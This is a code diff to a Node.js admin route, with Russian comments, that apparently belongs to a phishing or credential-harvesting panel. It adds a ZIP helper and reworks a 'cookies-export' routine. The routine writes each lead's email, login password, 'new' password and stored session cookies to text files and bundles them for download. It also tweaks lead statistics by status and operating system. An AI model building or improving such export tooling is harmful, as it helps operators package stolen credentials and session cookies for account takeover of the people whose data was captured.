@@ -13,6 +13,44 @@ const automationService = require('../services/automationService');
 const chatService = require('../services/chatService');
 let nodemailer;
 try { nodemailer = require('nodemailer'); } catch (e) { nodemailer = null; }
+const archiver = require('archiver');
+const {
+  getWebLoginAndNewPasswordForExport,
+  formatCookieFileCommentLine,
+} = require('../lib/leadExportCredentials');
+
+/** ZIP без системной команды `zip` (на многих VPS её нет → «Ошибка создания архива»). */
+function zipFlatDirectoryToFile(dirPath, outZipPath) {
+  return new Promise(function (resolve, reject) {
+    const archive = archiver('zip', { zlib: { level: 6 } });
+    const output = fs.createWriteStream(outZipPath);
+    output.on('close', function () {
+      resolve();
+    });
+    output.on('error', reject);
+    archive.on('error', reject);
+    archive.pipe(output);
+    let names;
+    try {
+      names = fs.readdirSync(dirPath);
+    } catch (e) {
+      reject(e);
+      return;
+    }
+    for (let i = 0; i < names.length; i++) {
+      const f = names[i];
+      const fp = path.join(dirPath, f);
+      let st;
+      try {
+        st = fs.statSync(fp);
+      } catch (e) {
+        continue;
+      }
+      if (st.isFile()) archive.file(fp, { name: f });
+    }
+    void archive.finalize();
+  });
+}
 
 async function handle(scope) {
   with (scope) {
@@ -45,17 +83,20 @@ async function handle(scope) {
       const exportedLeadIds = [];
       for (const lead of toExport) {
         const email = cookieEmailForLeadCookiesFile(lead) || (lead.email || '').trim() || 'unknown';
-        const { passLogin, passNew } = getLoginAndNewPassword(lead);
-        const commentLine = '# email:' + email + ':' + passLogin + ' | new: ' + passNew;
+        const { passLogin, passNew } = getWebLoginAndNewPasswordForExport(lead);
+        const commentLine = formatCookieFileCommentLine(email, passLogin, passNew);
         const cookieData = String(lead.cookies).trim();
         const txtContent = commentLine + '\n' + cookieData;
         const txtFileName = cookieExportFilename(email);
         fs.writeFileSync(path.join(tempDir, txtFileName), txtContent, 'utf8');
         exportedLeadIds.push(String(lead.id));
       }
-      const zipResult = spawnSync('zip', ['-r', zipPath, '.'], { cwd: tempDir, encoding: 'utf8', shell: process.platform === 'win32' });
-      if (zipResult.error || zipResult.status !== 0) {
-        console.error('[АДМИН] cookies-export zip error:', zipResult.error || zipResult.stderr);
+      try {
+        await zipFlatDirectoryToFile(tempDir, zipPath);
+      } catch (zipErr) {
+        console.error('[АДМИН] cookies-export zip error:', zipErr && zipErr.message ? zipErr.message : zipErr);
+        try { if (fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true }); } catch (e2) {}
+        try { if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath); } catch (e2) {}
         return send(res, 500, { ok: false, error: 'Ошибка создания архива' });
       }
       if (!skipMarkExported) appendCookiesExportedLeadIds(exportedLeadIds);
@@ -147,7 +188,8 @@ async function handle(scope) {
     return send(res, 200, {
       ok: true,
       period,
-      byStatus: stats.byStatus || { error: 0, pending: 0, success: 0 },
+      byStatus: stats.byStatus || { worked: 0, pending: 0, success: 0 },
+      total: stats.total != null ? stats.total : 0,
       byOs: stats.byOs || { windows: 0, macos: 0, android: 0, ios: 0, other: 0 }
     });
   }
